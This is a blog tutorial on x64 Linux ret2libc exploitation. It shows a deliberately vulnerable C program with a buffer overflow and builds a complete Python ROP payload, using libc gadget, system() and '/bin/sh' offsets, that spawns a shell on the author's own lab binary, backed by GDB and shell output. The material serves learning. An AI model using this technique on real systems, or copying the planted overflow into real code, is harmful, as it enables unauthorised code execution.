---
layout:   post
title:   X64 Linux Binary Exploitation Part 2 Ret2Libc
description:   Buffer Buffer Overflows
date:   2022-12-11 01:20:00 +0300
image: '/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png'
tags:   [c,assembly,x86,32-bit,memory-segmentation,memory-segmentation,buffer-overflows]
featured:   false
---

In the previous post we have learned a general understanding on how registers, stack and the memory works 
when a binary is being executed. Furthermore, I have explained how to exploit a misconstrued C code and 
execute a shell code with using the stack.

As you remember, when compiling the vulnerable C code, I have deactivated some built-in protection mechanisms 
that the compiler applies. I also said I will activate those step-by-step. In this paper, I will disable a 
stack protection mechanism called No eXecute (NX Bit) bit.

# No eXecute (NX Bit)
The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the 
binary as not executable. Therefore the stored input or data cannot be executed as code. 
This is significant because it prevents attackers from being able to jump to custom 
shellcode that they've stored on the stack or in a global variable. 

When we compiled the source code in the previous paper, I passed **-z execstack** argument to the compiler, which 
makes the stack segment of the program executable. Therefore, when we inject shell code into the buffer, we could 
run it by making the RIP point to the starting address of our shell code.

Since it is not possible to execute the shell code into the buffer when the NX bit is activated,
we will have to find a way to walk around that protection. We will still be modifying the RIP as we did before, 
however, in order to bypass that guard, we will not be pointing to the stack but to a different memory location.

* # Vulnerable Code

{% highlight c %}

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vuln(char *input);

int main(int argc, char **argv)
{
  if (argc > 1){
    vuln(argv[1]);
  };
  return 0;
}

void vuln(char *input){
  char buffer[256];
  memcpy(buffer, input, 300);
}

{% endhighlight %}

This is the vulnerable code I will be using in this demo. The code we will use here is almost identical to the previous one
with one little tweak. Instead of using strcpy() this time I will be using memcpy() function. I will explain why I made this 
decision in the following sections but for now, to sum up, strcpy() has a built-in mechanism called **null terminator**.
We do not want that. Do not worry, I will be explaining it in much detail. 

memcpy() function simply takes a destination buffer as it's first argument and a source pointer as its second.
The third argument declares how many bytes will be written into the destination buffer read from the source.

* # Checking the NX bit
Let's compile it.

{% highlight shell %}
KnuckleSecurity :: -> gcc -no-pie -fno-stack-protector ret2libc.c -o ret2libc.elf -D_FORTIFY_SOURCE=0 -g
ret2libc.c: In function ‘vuln’:
ret2libc.c:18:3: warning: ‘memcpy’ writing 300 bytes into a region of size 256 overflows the destination [-Wstringop-overflow=]
   18 |   memcpy(buffer, input, 300);
      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~
ret2libc.c:17:8: note: destination object ‘buffer’ of size 256
   17 |   char buffer[256];
      |        ^~~~~~
{% endhighlight %}

As you can see this time we do not pass the **-z execstack** argument. Therefore, the stack is no longer executable and we 
no longer can execute any code in the stack segment.
Furthermore you can see the compiler screaming that it is not safe to write 300 bytes into a 256 byte array. Good for you compiler, 
we do not care.

I will be disabling **-fno-stack-protector --no-pie** and the **-D_FORTIFY_SOURCE** protections in the following papers.

Let's check the NX bit.

{% highlight bash %}
KnuckleSecurity :: -> gdb -q ret2libc.elf
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from ret2libc.elf...
gef➤  checksec
[+] checksec for '/home/burak/programming/reverse/ret2libc.elf'
[*] .gdbinit-gef.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘
NX                            : ✓ # <-- It is enabled. Stack is not executable.
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial

{% endhighlight %}


# What is libc?
The term "libc" is commonly used as a shorthand for the "standard
C library", a library of standard functions that can be used by
all C programs (and sometimes by programs in other languages).
Because of some history, use of the term "libc" to
refer to the standard C library on Linux.

# Attack Vector 

Recall how you're including external libraries in order to use the functions you did not 
manually define. libc contains both normal and system call functions within. We know the stack is not executable, but the 
.text segment has to be executable. Since .text segment contains the compiled machine instructions we write, we can set the EIP 
to point to the any instruction we think it is useful to us stored in the text segment.

The trick is this; when the source code
includes a header file such as **\<stdlib.h\>** in order to use **exit()** function for instance, it also loads the assembled 
machine instructions of all 
the other functions comes with the **\<stdlib.h\>** library into the memory regardless of whether they're being called or not.
For instance, in that library, 
there is a function defined as **system()** which executes the first argument given to it in the shell, which is useful.
Therefore, if we can 
point to that function and somehow pass the parameter we want to execute, we can abuse it to execute a shell.

In this demo our aim is to call the **system()** function and pass the **/bin/sh** to it by abusing the memcpy().

So let's first try to understand how the system() function executes /bin/sh.

{% highlight c %}
#include <stdlib.h>

int main(){
  system("/bin/sh");
}
{% endhighlight %}


{% highlight shell %}
KnuckleSecurity :: -> gcc system.c -o system.elf
KnuckleSecurity :: -> gdb -q system.elf
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from system.elf...
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000001139 <+0>:     push   rbp
   0x000000000000113a <+1>:     mov    rbp,rsp
   0x000000000000113d <+4>:     lea    rax,[rip+0xec0]        # 0x2004
   0x0000000000001144 <+11>:    mov    rdi,rax
   0x0000000000001147 <+14>:    call   0x1030 <system@plt>
   0x000000000000114c <+19>:    mov    eax,0x0
   0x0000000000001151 <+24>:    pop    rbp
   0x0000000000001152 <+25>:    ret
End of assembler dump.
gef➤  x/s 0x2004
0x2004: "/bin/sh"
{% endhighlight %}

First, main function completes its procedure prologue. And then writes the effective address of where the 
**/bin/sh** string is stored to the accumulator. In the next step the accumulator is being copied to the 
destination index. And finally program calls for the system(). As you remember from the previous paper, 
you should be familiar with this function invocation. It is SysV calling convention. The RDI holds the value of 
the first argument given to the function before its call. Therefore, we now have a plan. We should 
somehow write to the RDI and set the RIP to the starting address of the system(), and that way we can 
spawn a shell.

# Exploitation

Step by step we will build a Python script to spawn a shell.

* # Finding the library 

Before moving on, we first we need to find out in what address libc's first instruction is being loaded 
in the program's .text segment. We can list dynamic dependencies with **ldd** command in linux.

{% highlight shell %}
KnuckleSecurity :: -> ldd ret2libc.elf
        linux-vdso.so.1 (0x00007ffff7fc8000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7dbe000) # <-- libc base address
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fca000)
{% endhighlight %}

If we dump that object file, we will see all the instructions libc.so.6 includes.

{% highlight shell %}
KnuckleSecurity :: -> objdump -M intel -d /usr/lib/libc.so.6  | head -n25

/usr/lib/libc.so.6:     file format elf64-x86-64


Disassembly of section .plt:

0000000000022000 <.plt>:
   22000:       ff 35 ea 5f 1b 00       push   QWORD PTR [rip+0x1b5fea]        # 1d7ff0 <h_errlist@@GLIBC_2.2.5+0xe30>
   22006:       f2 ff 25 eb 5f 1b 00    bnd jmp QWORD PTR [rip+0x1b5feb]        # 1d7ff8 <h_errlist@@GLIBC_2.2.5+0xe38>
   2200d:       0f 1f 00                nop    DWORD PTR [rax]
   22010:       f3 0f 1e fa             endbr64
   22014:       68 1f 00 00 00          push   0x1f
   22019:       f2 e9 e1 ff ff ff       bnd jmp 22000 <__h_errno@@GLIBC_PRIVATE+0x21f8c>
   2201f:       90                      nop
   22020:       f3 0f 1e fa             endbr64
   22024:       68 1e 00 00 00          push   0x1e
   22029:       f2 e9 d1 ff ff ff       bnd jmp 22000 <__h_errno@@GLIBC_PRIVATE+0x21f8c>
   2202f:       90                      nop
   22030:       f3 0f 1e fa             endbr64
   22034:       68 1d 00 00 00          push   0x1d
   22039:       f2 e9 c1 ff ff ff       bnd jmp 22000 <__h_errno@@GLIBC_PRIVATE+0x21f8c>
   2203f:       90                      nop
   22040:       f3 0f 1e fa             endbr64
   22044:       68 1c 00 00 00          push   0x1c
   22049:       f2 e9 b1 ff ff ff       bnd jmp 22000 <__h_errno@@GLIBC_PRIVATE+0x21f8c>
{% endhighlight %}

I have only printed out some instructions. There are 362635 instructions in that library. Those instructions involve 
the predefined functions such as system() or exit().

Remember the plan, RDI should be pointing to a **/bin/sh** string. So, how we can put that value in to the RDI?
We do not have manual access to write to that register. 
If we can put the address of the **/bin/sh** string on top of the stack and find a ROP gadget (this is what each instruction in that 
dump file is called Therefore I will be referring those as the ROP gadgets) that pops the value from stack to the 
RDI, we can accomplish our first goal. POP instruction moves the value that sits on top of the stack to any destination and 
increments the stack pointer. Therefore, we are looking for a **pop rdi** instruction. That ROP gadget also should 
immediately return since we do not want anything else to happen after POP operation. So, we are looking for **pop rdi; ret**.


* # ROP Gadgets

It is possible to find any ROP gadget with dumping the object file and manipulating the output. However, it is not the 
best way to do it. There is a program called [**ropper**](https://github.com/sashs/Ropper) which exactly does the thing we are trying to do. We can search for 
any gadget with the **ropper**.

{% highlight shell %}
KnuckleSecurity :: -> ropper
(ropper)> file /usr/lib/libc.so.6 # <-- Declare the library which we want to search in.
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc.so.6/ELF/x86_64)> search /1/ pop rdi; ret # <-- Search for pop rdi gadget
[INFO] Searching for gadgets: pop rdi

[INFO] File: /usr/lib/libc.so.6
0x0000000000107c71: pop rdi; call rax; #<-- call rax, nope.
0x0000000000026634: pop rdi; jmp rax; #<-- jmp rax, nope
0x00000000000d2854: pop rdi; jmp rdi; #<-- jmp rdi, nope.
0x0000000000023835: pop rdi; ret; # <-- After popping the value to the rdi, it returns. That is what we are looking for.
{% endhighlight %}

If you paid attention, the address is weird. That is because it is not its real address. It is the relative address 
of the gadget to library's base address. Therefore:

* libc.so.6 base address = 0x00007ffff7dbe000
* pop rdi; ret; relative address = 0x23835
* pop rdi address = 0x7ffff7de1835
* ret address = 0x7ffff7de1836

Let's validate the addresses with using the GDB. I will set a break point on the main function and run 
the program since those addresses are not reachable if the program is not being executed.

{% highlight shell %}
0x007fffffffe618│+0x0030: 0x483f8b5e097bf1b7
0x007fffffffe620│+0x0038: 0x0000000000000000
-----code:x86:64 ────
     0x40111c <__do_global_dtors_aux+44> nop    DWORD PTR [rax+0x0]
     0x401120 <frame_dummy+0>  endbr64
     0x401124 <frame_dummy+4>  jmp    0x4010b0 <register_tm_clones>
 →   0x401126 <main+0>         push   rbp
     0x401127 <main+1>         mov    rbp, rsp
     0x40112a <main+4>         sub    rsp, 0x10
     0x40112e <main+8>         mov    DWORD PTR [rbp-0x4], edi
     0x401131 <main+11>        mov    QWORD PTR [rbp-0x10], rsi
     0x401135 <main+15>        cmp    DWORD PTR [rbp-0x4], 0x1
-----source:ret2libc.c+9 ────
      4  #include <stdlib.h>
      5
      6  void vuln(char *input);
      7
      8  int main(int argc, char **argv)
 →    9  {
     10    if (argc > 1){
     11      vuln(argv[1]);
     12    };
     13    return 0;
     14  }
-----threads ────
[#0] Id 1, Name: "ret2libc.elf", stopped 0x401126 in main (), reason: BREAKPOINT
-----trace ────
[#0] 0x401126 → main(argc=0x7fff, argv=0x0)
----ret2libc.elf 
gef➤  x/i 0x7ffff7de1835
   0x7ffff7de1835 <iconv+197>:  pop    rdi # <-- Perfect!
gef➤  x/i 0x7ffff7de1836
   0x7ffff7de1836 <iconv+198>:  ret # <-- Perfcet!

{% endhighlight %}

Addresses match. Now we need to find a pointer address which points to a /bin/sh string.

{% highlight bash %}
KnuckleSecurity :: -> strings -tx /usr/lib/libc.so.6 | grep /bin/sh
 198031 /bin/sh
{% endhighlight %}
Again, 0x198031 is the relative address to the starting address of the libc.so.6.

{% highlight bash %}
gef➤  x/s 0x00007ffff7dbe000+0x198031
0x7ffff7f56031: "/bin/sh"
{% endhighlight %}

We now should find the address of the system() function in the libc.

{% highlight bash %}
KnuckleSecurity :: -> readelf -s /usr/lib/libc.so.6  | grep system
  1023: 00000000000493d0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
{% endhighlight %}

Let's validate the offset by adding it to the base address and see if that address points to the system() with GDB.
{% highlight bash %}
gef➤  x/i 0x00007ffff7dbe000+0x493d0
   0x7ffff7e073d0 <system>:     endbr64
{% endhighlight %}
It does.

* # Assembling All the Pieces

Now we have all the addresses we need. It is time to find the offset of the RIP by overloading the buffer. You should 
know this part already from the previous paper.

{% highlight bash %}
gef➤  pattern create 500 # <-- Creating the pattern
[+] Generating a pattern of 500 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
[+] Saved as '$_gef1'
gef➤  r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
Starting program: /home/burak/programming/reverse/ret2libc.elf aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa # <-- Sending the pattern
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc8000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401187 in vuln (input=0x7fffffffe833 "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa") at ret2libc.c:19
19      }
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffe2c0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x007fffffffe4f8  →  0x007fffffffe806  →  "/home/burak/programming/reverse/ret2libc.elf"
$rcx   : 0x007fffffffe2c0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rdx   : 0x007fffffffe36c  →  "aaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaa[...]"
$rsp   : 0x007fffffffe3c8  →  0x6261616161616169 ("iaaaaaab"?)
$rbp   : 0x6261616161616168 ("haaaaaab"?)
$rsi   : 0x007fffffffe953  →  "laaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabra[...]"
$rdi   : 0x007fffffffe3e0  →  0x626161616161616c ("laaaaaab"?)
$rip   : 0x00000000401187  →  <vuln+50> ret
$r8    : 0x0
$r9    : 0x007ffff7fce890  →   endbr64
$r10   : 0x3
$r11   : 0x007ffff7f117b0  →   endbr64
$r12   : 0x0
$r13   : 0x007fffffffe510  →  0x007fffffffea28  →  "ALACRITTY_LOG=/tmp/Alacritty-1014.log"
$r14   : 0x00000000403df0  →  0x000000004010f0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
$eflags: [zero CARRY parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe3c8│+0x0000: 0x6261616161616169     ← $rsp
0x007fffffffe3d0│+0x0008: 0x626161616161616a
0x007fffffffe3d8│+0x0010: 0x626161616161616b
0x007fffffffe3e0│+0x0018: 0x626161616161616c     ← $rdi
0x007fffffffe3e8│+0x0020: 0x00007fff6161616d
0x007fffffffe3f0│+0x0028: 0x007fffffffe4e0  →  0x007fffffffe4e8  →  0x00000000000038 ("8"?)
0x007fffffffe3f8│+0x0030: 0x00000000401126  →  <main+0> push rbp
0x007fffffffe400│+0x0038: 0x00000200400040 ("@"?)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401180 <vuln+43>        call   0x401030 <memcpy@plt>
     0x401185 <vuln+48>        nop
     0x401186 <vuln+49>        leave
 →   0x401187 <vuln+50>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:ret2libc.c+19 ────
     14  }
     15
     16  void vuln(char *input){
     17    char buffer[256];
     18    memcpy(buffer, input, 300);
 →   19  }
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2libc.elf", stopped 0x401187 in vuln (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401187 → vuln(input=0x7fffffffe833 "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa")
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r rbp
rbp            0x6261616161616168  0x6261616161616168
gef➤  pattern search $rbp # <-- Searching the pattern offset
[+] Searching for '$rbp'
[+] Found at offset 256 (little-endian search) likely # <-- 256 bytes to the initial address of the SFP.
{% endhighlight %}

Starting from the buffer, if we go 256-bytes, we will hit the first memory address of where the SFP stored.
Therefore, the upcoming eight bytes are dedicated for the SFP. Further six bytes stores the RIP 
(Remember the canonical addresses for X64 and why the address is not 8 bytes).

Finally, we know the offset and have all the addresses. We are good to go. I need you full attention here 
because this part will be a little confusing.

Remember how the procedure prologue and epilogue take its place.

* Prologue / CALL 
1. Push RBP to the stack. 
2. Move RBP to RSP.
3. Put the arguments to the registers.
4. Push the return address of the caller function to the stack.
5. Jump to the first instruction of the calling function.

* Epilogue / RET
1. Pop the SFP to the RBP. Restore the base pointer.
2. Pop the saved return address to the instruction pointer.

Those prologue and epilogue sequences are only occurs when a **CALL** or **RET** instruction is 
hit by the instruction pointer. So, if we manually set the instruction pointer to any address, 
we are not going to encounter with no prologue sequence. Therefore, when we writing to the stack, 
we have to remember how a function uses the stack and insert anything accordingly.

So what we are trying to build is this:

{% highlight shell %}
./ret2libc.elf $(python -c 'print("A"*256+"POP RDI; RET; ADDR"+"/bin/bash ADDR"+"SYSTEM() ADDR")')
{% endhighlight %}

When we supply the program with this payload, this is what is going to happen:

1. vuln() function will complete its procedure epilogue and restore the base pointer. Therefore, restore the stack frame.
After restoring the stack frame, the overwritten return address will be at the top of the stack.
2. Finally vuln() function will execute the RET instruction after restoring the stack. 
That instruction will pop the topmost address stored in the stack to the 
instruction pointer.
3. After vuln() function pops the return address and points to pop rdi the address of the /bin/sh address will be the 
topmost value stored on the stack. 
4. pop rdi instruction will pop the address of the /bin/sh to the rdi.
5. When pop rdi is done, the instruction pointer will execute the ret instruction. That ret instruction is again going to pop the topmost 
value stored in the stack to the instruction pointer. Therefore after the address of the /bin/sh pointer, the 
adress of the system() function should come.
6. system() function is going to take the value written in the rdi register as its argument and will drop us a shell.

So, with that knowledge, let's forge a Python script.

{% highlight Python %}
import sys
import struct

libc_base_address = 0x00007ffff7dbe000
pop_rdi_offset = 0x0000000000023835
bin_sh_offset= 0x198031
system_function_offset = 0x00000000000493d0

pop_rdi_address = struct.pack("Q",libc_base_address+pop_rdi_offset)
bin_sh_address = struct.pack("Q",libc_base_address+bin_sh_offset)
system_function_address = struct.pack("Q",libc_base_address+system_function_offset)

buff = b"A"*256
rbp = b"B"*8

sys.stdout.buffer.write(buff+rbp+pop_rdi_address+bin_sh_address+system_function_address)
{% endhighlight %}

Let's supply the ret2libc.elf with that payload.

{% highlight shell %}
KnuckleSecurity :: -> gdb -q ret2libc.elf
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from ret2libc.elf...
gef➤  r $(python ret2libc2.py)
Starting program: /home/burak/programming/reverse/ret2libc.elf $(python ret2libc2.py)
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc8000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e070b3 in ?? () from /usr/lib/libc.so.6
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007ffff7f9e260  →  0x007fffffffe5e0  →  0x007fffffffea28  →  "ALACRITTY_LOG=/tmp/Alacritty-1014.log"
$rbx   : 0x007fffffffe2f8  →  0x0000000000000c ("
                                                 "?)
$rcx   : 0x007fffffffe2f8  →  0x0000000000000c ("
                                                 "?)
$rdx   : 0x0
$rsp   : 0x007fffffffe0e8  →  0x0000000000000000
$rbp   : 0x007fffffffe158  →  0x0000000000000000
$rsi   : 0x007ffff7f56031  →  0x68732f6e69622f ("/bin/sh"?)
$rdi   : 0x007fffffffe0f4  →  0x0000000000000000
$rip   : 0x007ffff7e070b3  →   movaps XMMWORD PTR [rsp+0x50], xmm0
$r8    : 0x007fffffffe138  →  0x0000000000000000
$r9    : 0x007fffffffe5e0  →  0x007fffffffea28  →  "ALACRITTY_LOG=/tmp/Alacritty-1014.log"
$r10   : 0x8
$r11   : 0x246
$r12   : 0x007ffff7f56031  →  0x68732f6e69622f ("/bin/sh"?)
$r13   : 0x007fffffffe5e0  →  0x007fffffffea28  →  "ALACRITTY_LOG=/tmp/Alacritty-1014.log"
$r14   : 0x00000000403df0  →  0x000000004010f0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe0e8│+0x0000: 0x0000000000000000     ← $rsp
0x007fffffffe0f0│+0x0008: 0x00000000ffffffff
0x007fffffffe0f8│+0x0010: 0x0000000000000000
0x007fffffffe100│+0x0018: 0x0000000000000000
0x007fffffffe108│+0x0020: 0x0000000000000000
0x007fffffffe110│+0x0028: 0x0000000000000000
0x007fffffffe118│+0x0030: 0x0000000000000000
0x007fffffffe120│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e070a4                  mov    QWORD PTR [rsp+0x60], r12
   0x7ffff7e070a9                  mov    r9, QWORD PTR [rax]
   0x7ffff7e070ac                  lea    rsi, [rip+0x14ef7e]        # 0x7ffff7f56031
 → 0x7ffff7e070b3                  movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7ffff7e070b8                  mov    QWORD PTR [rsp+0x68], 0x0
   0x7ffff7e070c1                  call   0x7ffff7eb3710 <posix_spawn>
   0x7ffff7e070c6                  mov    rdi, rbx
   0x7ffff7e070c9                  mov    r12d, eax
   0x7ffff7e070cc                  call   0x7ffff7eb3610 <posix_spawnattr_destroy>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2libc.elf", stopped 0x7ffff7e070b3 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e070b3 → movaps XMMWORD PTR [rsp+0x50], xmm0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
{% endhighlight %}

There is a problem. Instead of having a shell, debugger triggers an instruction called **movaps**.

If segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges,
then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system().
Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. 
The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction 
but this is easily violated during ROP chain execution, causing all further calls from that 
function to be made with a misaligned stack. movaps triggers a general protection fault 
when operating on unaligned data, so try padding your ROP chain with an extra ret before 
returning into a function or return further into a function to skip a push instruction. 

We can find an extra RET instruction address in the libc file, following exactly the 
process we did in the POP RDI, RET gadget (using the ropper or a similar tool).
The final exploitation script will be as follows:

{% highlight Python %}

import sys
import struct

libc_base_address = 0x00007ffff7dbe000
pop_rdi_offset = 0x0000000000023835
bin_sh_offset= 0x198031
system_function_offset = 0x00000000000493d0
exit_function_offset = 0x000000000003b100 
ret_function_offset = 0x00000000000f6ae3

pop_rdi_address = struct.pack("Q",libc_base_address+pop_rdi_offset)
bin_sh_address = struct.pack("Q",libc_base_address+bin_sh_offset)
system_function_address = struct.pack("Q",libc_base_address+system_function_offset)
exit_function_address = struct.pack("Q",libc_base_address+exit_function_offset)
ret_function_address = struct.pack("Q",libc_base_address+ret_function_offset)

buff = b"A"*256
rbp = b"B"*8

sys.stdout.buffer.write(buff+rbp+ret_function_address+pop_rdi_address+bin_sh_address+system_function_address+exit_function_address)

{% endhighlight %}

In addition, I have added one more return address at the end. If we exit the shell, system() function will try to retun to 
an address, if it lacks that address, program will crash. After spawnig a shell it does not really matter but it is the 
best practice I think. 

Let's run the program.

{% highlight shell %}
KnuckleSecurity :: -> ./ret2libc.elf $(python ret2libc.py)
sh-5.1$ exit # <-- Spawned the sh shell.
KnuckleSecurity :: -> 
{% endhighlight %}

Worked like charm. We have successfully spawned a shell.

Let me show you what would have happened if we didn't add the exit() function's address.

{% highlight shell %}
KnuckleSecurity :: -> ./ret2libc.elf $(python ret2libc.py)
sh-5.1$ exit
exit
[1]    2021528 segmentation fault (core dumped)  ./ret2libc.elf $(python ret2libc.py)
KnuckleSecurity :: ->
{% endhighlight %}

Segmentation fault. Again, it does not matter after we drop the shell. Just for best practice, add it at the end.

# Bibliography
* [**wikipedia.com-Function Prologue and Epilogue**](https://en.wikipedia.org/wiki/Function_prologue_and_epilogue)<br>
 
* [**feliclouiter.com-Leave**](https://www.felixcloutier.com/x86/leave)<br>
 
* [**isabekov.pro-Stack Alignment When Mixing Asm and C Code**](https://www.isabekov.pro/stack-alignment-when-mixing-asm-and-c-code/)<br>
 
